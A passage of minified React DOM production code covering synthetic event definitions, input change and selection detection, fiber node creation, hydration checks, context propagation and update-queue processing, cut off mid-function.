			145: "ScrollLock",
			224: "Meta",
		},
		Xd = {
			Alt: "altKey",
			Control: "ctrlKey",
			Meta: "metaKey",
			Shift: "shiftKey",
		};
	function Qd(l) {
		var t = this.nativeEvent;
		return t.getModifierState
			? t.getModifierState(l)
			: (l = Xd[l])
			? !!t[l]
			: !1;
	}
	function uc() {
		return Qd;
	}
	var Zd = _({}, Aa, {
			key: function (l) {
				if (l.key) {
					var t = Yd[l.key] || l.key;
					if (t !== "Unidentified") return t;
				}
				return l.type === "keypress"
					? ((l = _u(l)), l === 13 ? "Enter" : String.fromCharCode(l))
					: l.type === "keydown" || l.type === "keyup"
					? Gd[l.keyCode] || "Unidentified"
					: "";
			},
			code: 0,
			location: 0,
			ctrlKey: 0,
			shiftKey: 0,
			altKey: 0,
			metaKey: 0,
			repeat: 0,
			locale: 0,
			getModifierState: uc,
			charCode: function (l) {
				return l.type === "keypress" ? _u(l) : 0;
			},
			keyCode: function (l) {
				return l.type === "keydown" || l.type === "keyup"
					? l.keyCode
					: 0;
			},
			which: function (l) {
				return l.type === "keypress"
					? _u(l)
					: l.type === "keydown" || l.type === "keyup"
					? l.keyCode
					: 0;
			},
		}),
		Ld = Xl(Zd),
		Vd = _({}, Uu, {
			pointerId: 0,
			width: 0,
			height: 0,
			pressure: 0,
			tangentialPressure: 0,
			tiltX: 0,
			tiltY: 0,
			twist: 0,
			pointerType: 0,
			isPrimary: 0,
		}),
		Rf = Xl(Vd),
		Kd = _({}, Aa, {
			touches: 0,
			targetTouches: 0,
			changedTouches: 0,
			altKey: 0,
			metaKey: 0,
			ctrlKey: 0,
			shiftKey: 0,
			getModifierState: uc,
		}),
		Jd = Xl(Kd),
		kd = _({}, ye, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
		Wd = Xl(kd),
		$d = _({}, Uu, {
			deltaX: function (l) {
				return "deltaX" in l
					? l.deltaX
					: "wheelDeltaX" in l
					? -l.wheelDeltaX
					: 0;
			},
			deltaY: function (l) {
				return "deltaY" in l
					? l.deltaY
					: "wheelDeltaY" in l
					? -l.wheelDeltaY
					: "wheelDelta" in l
					? -l.wheelDelta
					: 0;
			},
			deltaZ: 0,
			deltaMode: 0,
		}),
		Fd = Xl($d),
		Id = _({}, ye, { newState: 0, oldState: 0 }),
		Pd = Xl(Id),
		lm = [9, 13, 27, 32],
		nc = Mt && "CompositionEvent" in window,
		Ma = null;
	Mt && "documentMode" in document && (Ma = document.documentMode);
	var tm = Mt && "TextEvent" in window && !Ma,
		Uf = Mt && (!nc || (Ma && 8 < Ma && 11 >= Ma)),
		wf = " ",
		Hf = !1;
	function Bf(l, t) {
		switch (l) {
			case "keyup":
				return lm.indexOf(t.keyCode) !== -1;
			case "keydown":
				return t.keyCode !== 229;
			case "keypress":
			case "mousedown":
			case "focusout":
				return !0;
			default:
				return !1;
		}
	}
	function qf(l) {
		return (
			(l = l.detail), typeof l == "object" && "data" in l ? l.data : null
		);
	}
	var Le = !1;
	function em(l, t) {
		switch (l) {
			case "compositionend":
				return qf(t);
			case "keypress":
				return t.which !== 32 ? null : ((Hf = !0), wf);
			case "textInput":
				return (l = t.data), l === wf && Hf ? null : l;
			default:
				return null;
		}
	}
	function am(l, t) {
		if (Le)
			return l === "compositionend" || (!nc && Bf(l, t))
				? ((l = Mf()), (Ou = lc = Vt = null), (Le = !1), l)
				: null;
		switch (l) {
			case "paste":
				return null;
			case "keypress":
				if (
					!(t.ctrlKey || t.altKey || t.metaKey) ||
					(t.ctrlKey && t.altKey)
				) {
					if (t.char && 1 < t.char.length) return t.char;
					if (t.which) return String.fromCharCode(t.which);
				}
				return null;
			case "compositionend":
				return Uf && t.locale !== "ko" ? null : t.data;
			default:
				return null;
		}
	}
	var um = {
		color: !0,
		date: !0,
		datetime: !0,
		"datetime-local": !0,
		email: !0,
		month: !0,
		number: !0,
		password: !0,
		range: !0,
		search: !0,
		tel: !0,
		text: !0,
		time: !0,
		url: !0,
		week: !0,
	};
	function Cf(l) {
		var t = l && l.nodeName && l.nodeName.toLowerCase();
		return t === "input" ? !!um[l.type] : t === "textarea";
	}
	function Yf(l, t, e, a) {
		Qe ? (Ze ? Ze.push(a) : (Ze = [a])) : (Qe = a),
			(t = Sn(t, "onChange")),
			0 < t.length &&
				((e = new Ru("onChange", "change", null, e, a)),
				l.push({ event: e, listeners: t }));
	}
	var Oa = null,
		_a = null;
	function nm(l) {
		Sr(l, 0);
	}
	function wu(l) {
		var t = ja(l);
		if (Sf(t)) return l;
	}
	function Gf(l, t) {
		if (l === "change") return t;
	}
	var Xf = !1;
	if (Mt) {
		var cc;
		if (Mt) {
			var ic = "oninput" in document;
			if (!ic) {
				var Qf = document.createElement("div");
				Qf.setAttribute("oninput", "return;"),
					(ic = typeof Qf.oninput == "function");
			}
			cc = ic;
		} else cc = !1;
		Xf = cc && (!document.documentMode || 9 < document.documentMode);
	}
	function Zf() {
		Oa && (Oa.detachEvent("onpropertychange", Lf), (_a = Oa = null));
	}
	function Lf(l) {
		if (l.propertyName === "value" && wu(_a)) {
			var t = [];
			Yf(t, _a, l, Fn(l)), zf(nm, t);
		}
	}
	function cm(l, t, e) {
		l === "focusin"
			? (Zf(), (Oa = t), (_a = e), Oa.attachEvent("onpropertychange", Lf))
			: l === "focusout" && Zf();
	}
	function im(l) {
		if (l === "selectionchange" || l === "keyup" || l === "keydown")
			return wu(_a);
	}
	function fm(l, t) {
		if (l === "click") return wu(t);
	}
	function sm(l, t) {
		if (l === "input" || l === "change") return wu(t);
	}
	function om(l, t) {
		return (
			(l === t && (l !== 0 || 1 / l === 1 / t)) || (l !== l && t !== t)
		);
	}
	var Fl = typeof Object.is == "function" ? Object.is : om;
	function Da(l, t) {
		if (Fl(l, t)) return !0;
		if (
			typeof l != "object" ||
			l === null ||
			typeof t != "object" ||
			t === null
		)
			return !1;
		var e = Object.keys(l),
			a = Object.keys(t);
		if (e.length !== a.length) return !1;
		for (a = 0; a < e.length; a++) {
			var u = e[a];
			if (!Bn.call(t, u) || !Fl(l[u], t[u])) return !1;
		}
		return !0;
	}
	function Vf(l) {
		for (; l && l.firstChild; ) l = l.firstChild;
		return l;
	}
	function Kf(l, t) {
		var e = Vf(l);
		l = 0;
		for (var a; e; ) {
			if (e.nodeType === 3) {
				if (((a = l + e.textContent.length), l <= t && a >= t))
					return { node: e, offset: t - l };
				l = a;
			}
			l: {
				for (; e; ) {
					if (e.nextSibling) {
						e = e.nextSibling;
						break l;
					}
					e = e.parentNode;
				}
				e = void 0;
			}
			e = Vf(e);
		}
	}
	function Jf(l, t) {
		return l && t
			? l === t
				? !0
				: l && l.nodeType === 3
				? !1
				: t && t.nodeType === 3
				? Jf(l, t.parentNode)
				: "contains" in l
				? l.contains(t)
				: l.compareDocumentPosition
				? !!(l.compareDocumentPosition(t) & 16)
				: !1
			: !1;
	}
	function kf(l) {
		l =
			l != null &&
			l.ownerDocument != null &&
			l.ownerDocument.defaultView != null
				? l.ownerDocument.defaultView
				: window;
		for (var t = zu(l.document); t instanceof l.HTMLIFrameElement; ) {
			try {
				var e = typeof t.contentWindow.location.href == "string";
			} catch {
				e = !1;
			}
			if (e) l = t.contentWindow;
			else break;
			t = zu(l.document);
		}
		return t;
	}
	function fc(l) {
		var t = l && l.nodeName && l.nodeName.toLowerCase();
		return (
			t &&
			((t === "input" &&
				(l.type === "text" ||
					l.type === "search" ||
					l.type === "tel" ||
					l.type === "url" ||
					l.type === "password")) ||
				t === "textarea" ||
				l.contentEditable === "true")
		);
	}
	var rm = Mt && "documentMode" in document && 11 >= document.documentMode,
		Ve = null,
		sc = null,
		Ra = null,
		oc = !1;
	function Wf(l, t, e) {
		var a =
			e.window === e
				? e.document
				: e.nodeType === 9
				? e
				: e.ownerDocument;
		oc ||
			Ve == null ||
			Ve !== zu(a) ||
			((a = Ve),
			"selectionStart" in a && fc(a)
				? (a = { start: a.selectionStart, end: a.selectionEnd })
				: ((a = (
						(a.ownerDocument && a.ownerDocument.defaultView) ||
						window
				  ).getSelection()),
				  (a = {
						anchorNode: a.anchorNode,
						anchorOffset: a.anchorOffset,
						focusNode: a.focusNode,
						focusOffset: a.focusOffset,
				  })),
			(Ra && Da(Ra, a)) ||
				((Ra = a),
				(a = Sn(sc, "onSelect")),
				0 < a.length &&
					((t = new Ru("onSelect", "select", null, t, e)),
					l.push({ event: t, listeners: a }),
					(t.target = Ve))));
	}
	function xe(l, t) {
		var e = {};
		return (
			(e[l.toLowerCase()] = t.toLowerCase()),
			(e["Webkit" + l] = "webkit" + t),
			(e["Moz" + l] = "moz" + t),
			e
		);
	}
	var Ke = {
			animationend: xe("Animation", "AnimationEnd"),
			animationiteration: xe("Animation", "AnimationIteration"),
			animationstart: xe("Animation", "AnimationStart"),
			transitionrun: xe("Transition", "TransitionRun"),
			transitionstart: xe("Transition", "TransitionStart"),
			transitioncancel: xe("Transition", "TransitionCancel"),
			transitionend: xe("Transition", "TransitionEnd"),
		},
		rc = {},
		$f = {};
	Mt &&
		(($f = document.createElement("div").style),
		"AnimationEvent" in window ||
			(delete Ke.animationend.animation,
			delete Ke.animationiteration.animation,
			delete Ke.animationstart.animation),
		"TransitionEvent" in window || delete Ke.transitionend.transition);
	function be(l) {
		if (rc[l]) return rc[l];
		if (!Ke[l]) return l;
		var t = Ke[l],
			e;
		for (e in t) if (t.hasOwnProperty(e) && e in $f) return (rc[l] = t[e]);
		return l;
	}
	var Ff = be("animationend"),
		If = be("animationiteration"),
		Pf = be("animationstart"),
		dm = be("transitionrun"),
		mm = be("transitionstart"),
		hm = be("transitioncancel"),
		ls = be("transitionend"),
		ts = new Map(),
		dc =
			"abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
				" "
			);
	dc.push("scrollEnd");
	function vt(l, t) {
		ts.set(l, t), ge(t, [l]);
	}
	var es = new WeakMap();
	function ct(l, t) {
		if (typeof l == "object" && l !== null) {
			var e = es.get(l);
			return e !== void 0
				? e
				: ((t = { value: l, source: t, stack: xf(t) }),
				  es.set(l, t),
				  t);
		}
		return { value: l, source: t, stack: xf(t) };
	}
	var it = [],
		Je = 0,
		mc = 0;
	function Hu() {
		for (var l = Je, t = (mc = Je = 0); t < l; ) {
			var e = it[t];
			it[t++] = null;
			var a = it[t];
			it[t++] = null;
			var u = it[t];
			it[t++] = null;
			var n = it[t];
			if (((it[t++] = null), a !== null && u !== null)) {
				var c = a.pending;
				c === null ? (u.next = u) : ((u.next = c.next), (c.next = u)),
					(a.pending = u);
			}
			n !== 0 && as(e, u, n);
		}
	}
	function Bu(l, t, e, a) {
		(it[Je++] = l),
			(it[Je++] = t),
			(it[Je++] = e),
			(it[Je++] = a),
			(mc |= a),
			(l.lanes |= a),
			(l = l.alternate),
			l !== null && (l.lanes |= a);
	}
	function hc(l, t, e, a) {
		return Bu(l, t, e, a), qu(l);
	}
	function ke(l, t) {
		return Bu(l, null, null, t), qu(l);
	}
	function as(l, t, e) {
		l.lanes |= e;
		var a = l.alternate;
		a !== null && (a.lanes |= e);
		for (var u = !1, n = l.return; n !== null; )
			(n.childLanes |= e),
				(a = n.alternate),
				a !== null && (a.childLanes |= e),
				n.tag === 22 &&
					((l = n.stateNode),
					l === null || l._visibility & 1 || (u = !0)),
				(l = n),
				(n = n.return);
		return l.tag === 3
			? ((n = l.stateNode),
			  u &&
					t !== null &&
					((u = 31 - $l(e)),
					(l = n.hiddenUpdates),
					(a = l[u]),
					a === null ? (l[u] = [t]) : a.push(t),
					(t.lane = e | 536870912)),
			  n)
			: null;
	}
	function qu(l) {
		if (50 < au) throw ((au = 0), (Si = null), Error(h(185)));
		for (var t = l.return; t !== null; ) (l = t), (t = l.return);
		return l.tag === 3 ? l.stateNode : null;
	}
	var We = {};
	function vm(l, t, e, a) {
		(this.tag = l),
			(this.key = e),
			(this.sibling =
				this.child =
				this.return =
				this.stateNode =
				this.type =
				this.elementType =
					null),
			(this.index = 0),
			(this.refCleanup = this.ref = null),
			(this.pendingProps = t),
			(this.dependencies =
				this.memoizedState =
				this.updateQueue =
				this.memoizedProps =
					null),
			(this.mode = a),
			(this.subtreeFlags = this.flags = 0),
			(this.deletions = null),
			(this.childLanes = this.lanes = 0),
			(this.alternate = null);
	}
	function Il(l, t, e, a) {
		return new vm(l, t, e, a);
	}
	function vc(l) {
		return (l = l.prototype), !(!l || !l.isReactComponent);
	}
	function Ot(l, t) {
		var e = l.alternate;
		return (
			e === null
				? ((e = Il(l.tag, t, l.key, l.mode)),
				  (e.elementType = l.elementType),
				  (e.type = l.type),
				  (e.stateNode = l.stateNode),
				  (e.alternate = l),
				  (l.alternate = e))
				: ((e.pendingProps = t),
				  (e.type = l.type),
				  (e.flags = 0),
				  (e.subtreeFlags = 0),
				  (e.deletions = null)),
			(e.flags = l.flags & 65011712),
			(e.childLanes = l.childLanes),
			(e.lanes = l.lanes),
			(e.child = l.child),
			(e.memoizedProps = l.memoizedProps),
			(e.memoizedState = l.memoizedState),
			(e.updateQueue = l.updateQueue),
			(t = l.dependencies),
			(e.dependencies =
				t === null
					? null
					: { lanes: t.lanes, firstContext: t.firstContext }),
			(e.sibling = l.sibling),
			(e.index = l.index),
			(e.ref = l.ref),
			(e.refCleanup = l.refCleanup),
			e
		);
	}
	function us(l, t) {
		l.flags &= 65011714;
		var e = l.alternate;
		return (
			e === null
				? ((l.childLanes = 0),
				  (l.lanes = t),
				  (l.child = null),
				  (l.subtreeFlags = 0),
				  (l.memoizedProps = null),
				  (l.memoizedState = null),
				  (l.updateQueue = null),
				  (l.dependencies = null),
				  (l.stateNode = null))
				: ((l.childLanes = e.childLanes),
				  (l.lanes = e.lanes),
				  (l.child = e.child),
				  (l.subtreeFlags = 0),
				  (l.deletions = null),
				  (l.memoizedProps = e.memoizedProps),
				  (l.memoizedState = e.memoizedState),
				  (l.updateQueue = e.updateQueue),
				  (l.type = e.type),
				  (t = e.dependencies),
				  (l.dependencies =
						t === null
							? null
							: {
									lanes: t.lanes,
									firstContext: t.firstContext,
							  })),
			l
		);
	}
	function Cu(l, t, e, a, u, n) {
		var c = 0;
		if (((a = l), typeof l == "function")) vc(l) && (c = 1);
		else if (typeof l == "string")
			c = yh(l, e, U.current)
				? 26
				: l === "html" || l === "head" || l === "body"
				? 27
				: 5;
		else
			l: switch (l) {
				case bt:
					return (
						(l = Il(31, e, t, u)),
						(l.elementType = bt),
						(l.lanes = n),
						l
					);
				case k:
					return Se(e.children, u, n, t);
				case ol:
					(c = 8), (u |= 24);
					break;
				case dl:
					return (
						(l = Il(12, e, t, u | 2)),
						(l.elementType = dl),
						(l.lanes = n),
						l
					);
				case I:
					return (
						(l = Il(13, e, t, u)),
						(l.elementType = I),
						(l.lanes = n),
						l
					);
				case Vl:
					return (
						(l = Il(19, e, t, u)),
						(l.elementType = Vl),
						(l.lanes = n),
						l
					);
				default:
					if (typeof l == "object" && l !== null)
						switch (l.$$typeof) {
							case xt:
							case vl:
								c = 10;
								break l;
							case Yl:
								c = 9;
								break l;
							case ht:
								c = 11;
								break l;
							case Kl:
								c = 14;
								break l;
							case Jl:
								(c = 16), (a = null);
								break l;
						}
					(c = 29),
						(e = Error(h(130, l === null ? "null" : typeof l, ""))),
						(a = null);
			}
		return (
			(t = Il(c, e, t, u)),
			(t.elementType = l),
			(t.type = a),
			(t.lanes = n),
			t
		);
	}
	function Se(l, t, e, a) {
		return (l = Il(7, l, a, t)), (l.lanes = e), l;
	}
	function gc(l, t, e) {
		return (l = Il(6, l, null, t)), (l.lanes = e), l;
	}
	function yc(l, t, e) {
		return (
			(t = Il(4, l.children !== null ? l.children : [], l.key, t)),
			(t.lanes = e),
			(t.stateNode = {
				containerInfo: l.containerInfo,
				pendingChildren: null,
				implementation: l.implementation,
			}),
			t
		);
	}
	var $e = [],
		Fe = 0,
		Yu = null,
		Gu = 0,
		ft = [],
		st = 0,
		pe = null,
		_t = 1,
		Dt = "";
	function Ne(l, t) {
		($e[Fe++] = Gu), ($e[Fe++] = Yu), (Yu = l), (Gu = t);
	}
	function ns(l, t, e) {
		(ft[st++] = _t), (ft[st++] = Dt), (ft[st++] = pe), (pe = l);
		var a = _t;
		l = Dt;
		var u = 32 - $l(a) - 1;
		(a &= ~(1 << u)), (e += 1);
		var n = 32 - $l(t) + u;
		if (30 < n) {
			var c = u - (u % 5);
			(n = (a & ((1 << c) - 1)).toString(32)),
				(a >>= c),
				(u -= c),
				(_t = (1 << (32 - $l(t) + u)) | (e << u) | a),
				(Dt = n + l);
		} else (_t = (1 << n) | (e << u) | a), (Dt = l);
	}
	function xc(l) {
		l.return !== null && (Ne(l, 1), ns(l, 1, 0));
	}
	function bc(l) {
		for (; l === Yu; )
			(Yu = $e[--Fe]), ($e[Fe] = null), (Gu = $e[--Fe]), ($e[Fe] = null);
		for (; l === pe; )
			(pe = ft[--st]),
				(ft[st] = null),
				(Dt = ft[--st]),
				(ft[st] = null),
				(_t = ft[--st]),
				(ft[st] = null);
	}
	var Cl = null,
		yl = null,
		tl = !1,
		je = null,
		pt = !1,
		Sc = Error(h(519));
	function Te(l) {
		var t = Error(h(418, ""));
		throw (Ha(ct(t, l)), Sc);
	}
	function cs(l) {
		var t = l.stateNode,
			e = l.type,
			a = l.memoizedProps;
		switch (((t[Hl] = l), (t[Gl] = a), e)) {
			case "dialog":
				K("cancel", t), K("close", t);
				break;
			case "iframe":
			case "object":
			case "embed":
				K("load", t);
				break;
			case "video":
			case "audio":
				for (e = 0; e < nu.length; e++) K(nu[e], t);
				break;
			case "source":
				K("error", t);
				break;
			case "img":
			case "image":
			case "link":
				K("error", t), K("load", t);
				break;
			case "details":
				K("toggle", t);
				break;
			case "input":
				K("invalid", t),
					pf(
						t,
						a.value,
						a.defaultValue,
						a.checked,
						a.defaultChecked,
						a.type,
						a.name,
						!0
					),
					Au(t);
				break;
			case "select":
				K("invalid", t);
				break;
			case "textarea":
				K("invalid", t),
					jf(t, a.value, a.defaultValue, a.children),
					Au(t);
		}
		(e = a.children),
			(typeof e != "string" &&
				typeof e != "number" &&
				typeof e != "bigint") ||
			t.textContent === "" + e ||
			a.suppressHydrationWarning === !0 ||
			Tr(t.textContent, e)
				? (a.popover != null && (K("beforetoggle", t), K("toggle", t)),
				  a.onScroll != null && K("scroll", t),
				  a.onScrollEnd != null && K("scrollend", t),
				  a.onClick != null && (t.onclick = pn),
				  (t = !0))
				: (t = !1),
			t || Te(l);
	}
	function is(l) {
		for (Cl = l.return; Cl; )
			switch (Cl.tag) {
				case 5:
				case 13:
					pt = !1;
					return;
				case 27:
				case 3:
					pt = !0;
					return;
				default:
					Cl = Cl.return;
			}
	}
	function Ua(l) {
		if (l !== Cl) return !1;
		if (!tl) return is(l), (tl = !0), !1;
		var t = l.tag,
			e;
		if (
			((e = t !== 3 && t !== 27) &&
				((e = t === 5) &&
					((e = l.type),
					(e =
						!(e !== "form" && e !== "button") ||
						Bi(l.type, l.memoizedProps))),
				(e = !e)),
			e && yl && Te(l),
			is(l),
			t === 13)
		) {
			if (
				((l = l.memoizedState),
				(l = l !== null ? l.dehydrated : null),
				!l)
			)
				throw Error(h(317));
			l: {
				for (l = l.nextSibling, t = 0; l; ) {
					if (l.nodeType === 8)
						if (((e = l.data), e === "/$")) {
							if (t === 0) {
								yl = yt(l.nextSibling);
								break l;
							}
							t--;
						} else (e !== "$" && e !== "$!" && e !== "$?") || t++;
					l = l.nextSibling;
				}
				yl = null;
			}
		} else
			t === 27
				? ((t = yl),
				  ie(l.type) ? ((l = Gi), (Gi = null), (yl = l)) : (yl = t))
				: (yl = Cl ? yt(l.stateNode.nextSibling) : null);
		return !0;
	}
	function wa() {
		(yl = Cl = null), (tl = !1);
	}
	function fs() {
		var l = je;
		return (
			l !== null &&
				(Ll === null ? (Ll = l) : Ll.push.apply(Ll, l), (je = null)),
			l
		);
	}
	function Ha(l) {
		je === null ? (je = [l]) : je.push(l);
	}
	var pc = j(null),
		Ee = null,
		Rt = null;
	function Kt(l, t, e) {
		E(pc, t._currentValue), (t._currentValue = e);
	}
	function Ut(l) {
		(l._currentValue = pc.current), M(pc);
	}
	function Nc(l, t, e) {
		for (; l !== null; ) {
			var a = l.alternate;
			if (
				((l.childLanes & t) !== t
					? ((l.childLanes |= t), a !== null && (a.childLanes |= t))
					: a !== null &&
					  (a.childLanes & t) !== t &&
					  (a.childLanes |= t),
				l === e)
			)
				break;
			l = l.return;
		}
	}
	function jc(l, t, e, a) {
		var u = l.child;
		for (u !== null && (u.return = l); u !== null; ) {
			var n = u.dependencies;
			if (n !== null) {
				var c = u.child;
				n = n.firstContext;
				l: for (; n !== null; ) {
					var i = n;
					n = u;
					for (var s = 0; s < t.length; s++)
						if (i.context === t[s]) {
							(n.lanes |= e),
								(i = n.alternate),
								i !== null && (i.lanes |= e),
								Nc(n.return, e, l),
								a || (c = null);
							break l;
						}
					n = i.next;
				}
			} else if (u.tag === 18) {
				if (((c = u.return), c === null)) throw Error(h(341));
				(c.lanes |= e),
					(n = c.alternate),
					n !== null && (n.lanes |= e),
					Nc(c, e, l),
					(c = null);
			} else c = u.child;
			if (c !== null) c.return = u;
			else
				for (c = u; c !== null; ) {
					if (c === l) {
						c = null;
						break;
					}
					if (((u = c.sibling), u !== null)) {
						(u.return = c.return), (c = u);
						break;
					}
					c = c.return;
				}
			u = c;
		}
	}
	function Ba(l, t, e, a) {
		l = null;
		for (var u = t, n = !1; u !== null; ) {
			if (!n) {
				if ((u.flags & 524288) !== 0) n = !0;
				else if ((u.flags & 262144) !== 0) break;
			}
			if (u.tag === 10) {
				var c = u.alternate;
				if (c === null) throw Error(h(387));
				if (((c = c.memoizedProps), c !== null)) {
					var i = u.type;
					Fl(u.pendingProps.value, c.value) ||
						(l !== null ? l.push(i) : (l = [i]));
				}
			} else if (u === kl.current) {
				if (((c = u.alternate), c === null)) throw Error(h(387));
				c.memoizedState.memoizedState !==
					u.memoizedState.memoizedState &&
					(l !== null ? l.push(ru) : (l = [ru]));
			}
			u = u.return;
		}
		l !== null && jc(t, l, e, a), (t.flags |= 262144);
	}
	function Xu(l) {
		for (l = l.firstContext; l !== null; ) {
			if (!Fl(l.context._currentValue, l.memoizedValue)) return !0;
			l = l.next;
		}
		return !1;
	}
	function Ae(l) {
		(Ee = l),
			(Rt = null),
			(l = l.dependencies),
			l !== null && (l.firstContext = null);
	}
	function Bl(l) {
		return ss(Ee, l);
	}
	function Qu(l, t) {
		return Ee === null && Ae(l), ss(l, t);
	}
	function ss(l, t) {
		var e = t._currentValue;
		if (((t = { context: t, memoizedValue: e, next: null }), Rt === null)) {
			if (l === null) throw Error(h(308));
			(Rt = t),
				(l.dependencies = { lanes: 0, firstContext: t }),
				(l.flags |= 524288);
		} else Rt = Rt.next = t;
		return e;
	}
	var gm =
			typeof AbortController < "u"
				? AbortController
				: function () {
						var l = [],
							t = (this.signal = {
								aborted: !1,
								addEventListener: function (e, a) {
									l.push(a);
								},
							});
						this.abort = function () {
							(t.aborted = !0),
								l.forEach(function (e) {
									return e();
								});
						};
				  },
		ym = T.unstable_scheduleCallback,
		xm = T.unstable_NormalPriority,
		Tl = {
			$$typeof: vl,
			Consumer: null,
			Provider: null,
			_currentValue: null,
			_currentValue2: null,
			_threadCount: 0,
		};
	function Tc() {
		return { controller: new gm(), data: new Map(), refCount: 0 };
	}
	function qa(l) {
		l.refCount--,
			l.refCount === 0 &&
				ym(xm, function () {
					l.controller.abort();
				});
	}
	var Ca = null,
		Ec = 0,
		Ie = 0,
		Pe = null;
	function bm(l, t) {
		if (Ca === null) {
			var e = (Ca = []);
			(Ec = 0),
				(Ie = zi()),
				(Pe = {
					status: "pending",
					value: void 0,
					then: function (a) {
						e.push(a);
					},
				});
		}
		return Ec++, t.then(os, os), t;
	}
	function os() {
		if (--Ec === 0 && Ca !== null) {
			Pe !== null && (Pe.status = "fulfilled");
			var l = Ca;
			(Ca = null), (Ie = 0), (Pe = null);
			for (var t = 0; t < l.length; t++) (0, l[t])();
		}
	}
	function Sm(l, t) {
		var e = [],
			a = {
				status: "pending",
				value: null,
				reason: null,
				then: function (u) {
					e.push(u);
				},
			};
		return (
			l.then(
				function () {
					(a.status = "fulfilled"), (a.value = t);
					for (var u = 0; u < e.length; u++) (0, e[u])(t);
				},
				function (u) {
					for (
						a.status = "rejected", a.reason = u, u = 0;
						u < e.length;
						u++
					)
						(0, e[u])(void 0);
				}
			),
			a
		);
	}
	var rs = b.S;
	b.S = function (l, t) {
		typeof t == "object" &&
			t !== null &&
			typeof t.then == "function" &&
			bm(l, t),
			rs !== null && rs(l, t);
	};
	var ze = j(null);
	function Ac() {
		var l = ze.current;
		return l !== null ? l : rl.pooledCache;
	}
	function Zu(l, t) {
		t === null ? E(ze, ze.current) : E(ze, t.pool);
	}
	function ds() {
		var l = Ac();
		return l === null ? null : { parent: Tl._currentValue, pool: l };
	}
	var Ya = Error(h(460)),
		ms = Error(h(474)),
		Lu = Error(h(542)),
		zc = { then: function () {} };
	function hs(l) {
		return (l = l.status), l === "fulfilled" || l === "rejected";
	}
	function Vu() {}
	function vs(l, t, e) {
		switch (
			((e = l[e]),
			e === void 0 ? l.push(t) : e !== t && (t.then(Vu, Vu), (t = e)),
			t.status)
		) {
			case "fulfilled":
				return t.value;
			case "rejected":
				throw ((l = t.reason), ys(l), l);
			default:
				if (typeof t.status == "string") t.then(Vu, Vu);
				else {
					if (((l = rl), l !== null && 100 < l.shellSuspendCounter))
						throw Error(h(482));
					(l = t),
						(l.status = "pending"),
						l.then(
							function (a) {
								if (t.status === "pending") {
									var u = t;
									(u.status = "fulfilled"), (u.value = a);
								}
							},
							function (a) {
								if (t.status === "pending") {
									var u = t;
									(u.status = "rejected"), (u.reason = a);
								}
							}
						);
				}
				switch (t.status) {
					case "fulfilled":
						return t.value;
					case "rejected":
						throw ((l = t.reason), ys(l), l);
				}
				throw ((Ga = t), Ya);
		}
	}
	var Ga = null;
	function gs() {
		if (Ga === null) throw Error(h(459));
		var l = Ga;
		return (Ga = null), l;
	}
	function ys(l) {
		if (l === Ya || l === Lu) throw Error(h(483));
	}
	var Jt = !1;
	function Mc(l) {
		l.updateQueue = {
			baseState: l.memoizedState,
			firstBaseUpdate: null,
			lastBaseUpdate: null,
			shared: { pending: null, lanes: 0, hiddenCallbacks: null },
			callbacks: null,
		};
	}
	function Oc(l, t) {
		(l = l.updateQueue),
			t.updateQueue === l &&
				(t.updateQueue = {
					baseState: l.baseState,
					firstBaseUpdate: l.firstBaseUpdate,
					lastBaseUpdate: l.lastBaseUpdate,
					shared: l.shared,
					callbacks: null,
				});
	}
	function kt(l) {
		return { lane: l, tag: 0, payload: null, callback: null, next: null };
	}
	function Wt(l, t, e) {
		var a = l.updateQueue;
		if (a === null) return null;
		if (((a = a.shared), (al & 2) !== 0)) {
			var u = a.pending;
			return (
				u === null ? (t.next = t) : ((t.next = u.next), (u.next = t)),
				(a.pending = t),
				(t = qu(l)),
				as(l, null, e),
				t
			);
		}
		return Bu(l, a, t, e), qu(l);
	}
	function Xa(l, t, e) {
		if (
			((t = t.updateQueue),
			t !== null && ((t = t.shared), (e & 4194048) !== 0))
		) {
			var a = t.lanes;
			(a &= l.pendingLanes), (e |= a), (t.lanes = e), of(l, e);
		}
	}
	function _c(l, t) {
		var e = l.updateQueue,
			a = l.alternate;
		if (a !== null && ((a = a.updateQueue), e === a)) {
			var u = null,
				n = null;
			if (((e = e.firstBaseUpdate), e !== null)) {
				do {
					var c = {
						lane: e.lane,
						tag: e.tag,
						payload: e.payload,
						callback: null,
						next: null,
					};
					n === null ? (u = n = c) : (n = n.next = c), (e = e.next);
				} while (e !== null);
				n === null ? (u = n = t) : (n = n.next = t);
			} else u = n = t;
			(e = {
				baseState: a.baseState,
				firstBaseUpdate: u,
				lastBaseUpdate: n,
				shared: a.shared,
				callbacks: a.callbacks,
			}),
				(l.updateQueue = e);
			return;
		}
		(l = e.lastBaseUpdate),
			l === null ? (e.firstBaseUpdate = t) : (l.next = t),
			(e.lastBaseUpdate = t);
	}
	var Dc = !1;
	function Qa() {
		if (Dc) {
			var l = Pe;
			if (l !== null) throw l;
		}
	}
	function Za(l, t, e, a) {
		Dc = !1;
		var u = l.updateQueue;
		Jt = !1;
		var n = u.firstBaseUpdate,
			c = u.lastBaseUpdate,
			i = u.shared.pending;
		if (i !== null) {
			u.shared.pending = null;
			var s = i,
				v = s.next;
			(s.next = null), c === null ? (n = v) : (c.next = v), (c = s);
			var x = l.alternate;
			x !== null &&
				((x = x.updateQueue),
				(i = x.lastBaseUpdate),
				i !== c &&
					(i === null ? (x.firstBaseUpdate = v) : (i.next = v),
					(x.lastBaseUpdate = s)));
		}
		if (n !== null) {
			var p = u.baseState;
			(c = 0), (x = v = s = null), (i = n);
			do {
				var g = i.lane & -536870913,
					y = g !== i.lane;
				if (y ? (W & g) === g : (a & g) === g) {
					g !== 0 && g === Ie && (Dc = !0),
						x !== null &&
							(x = x.next =
								{
									lane: 0,
									tag: i.tag,
									payload: i.payload,
									callback: null,
									next: null,
								});
					l: {
						var Y = l,
							w = i;
						g = t;
						var il = e;
						switch (w.tag) {
							case 1:
								if (((Y = w.payload), typeof Y == "function")) {
									p = Y.call(il, p, g);
									break l;
								}
								p = Y;
								break l;
							case 3:
								Y.flags = (Y.flags & -65537) | 128;
							case 0:
